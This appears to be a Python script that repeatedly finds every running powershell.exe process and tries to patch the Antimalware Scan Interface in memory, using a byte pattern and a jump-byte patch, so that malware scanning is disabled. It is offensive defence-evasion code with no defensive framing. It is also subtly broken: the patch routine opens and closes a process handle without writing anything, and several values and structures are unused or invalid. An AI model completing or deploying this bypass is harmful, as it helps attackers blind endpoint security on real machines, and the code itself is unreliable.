import ctypes
import time
from ctypes import wintypes

const = {
    "vmoperation": 0x0008,
    "vmread": 0x0010,
    "vmwrite": 0x0020,
    "th32snapproc": 0x2,
    "ptchdrq": 500 
}

patch = bytes([0xEB])

def SPatt(startaddr, pattern):
    patsiz = len(pattern)
    for i in range(len(startaddr)):
        if startaddr[i] == pattern[0]:
            j = 1
            while j < patsiz and (pattern[j] == '?' or startaddr[i+j] == pattern[j]):
                j += 1
            if j == patsiz:
                return i + 3
    return -1

def patchAmsi(tpid):
    pattern = bytes([0x48, 0x00, 0x00, 0x74, 0x00, 0x48, 0x00, 0x00, 0x74])
    prochandl = ctypes.windll.kernel32.OpenProcess(
        ctypes.wintypes.DWORD(const["vmoperation"] | const["vmread"] | const["vmwrite"]),
        False, tpid
    )
    ctypes.windll.kernel32.CloseHandle(prochandl)

def PatchAllPowershells(pn):
    hSnap = ctypes.windll.kernel32.CreateToolhelp32Snapshot(const["th32snapproc"], 0)
    pE = ctypes.wintypes.PROCESSENTRY32()
    pE.dwSize = ctypes.sizeof(pE)
    ctypes.windll.kernel32.Process32First(hSnap, ctypes.byref(pE))
    while True:
        if pE.szExeFile == pn:
            procId = pE.th32ProcessID
            result = patchAmsi(procId)
            if result == 0:
                print("AMSI patched", pE.th32ProcessID)
            elif result == 144:
                print("Already patched in this current console..")
            else:
                print("Patch failed")
        if not ctypes.windll.kernel32.Process32Next(hSnap, ctypes.byref(pE)):
            break
    ctypes.windll.kernel32.CloseHandle(hSnap)

def main():
    while True:
        PatchAllPowershells("powershell.exe")
        time.sleep(const["ptchdrq"] / 1000)

if __name__ == "__main__":
    main()
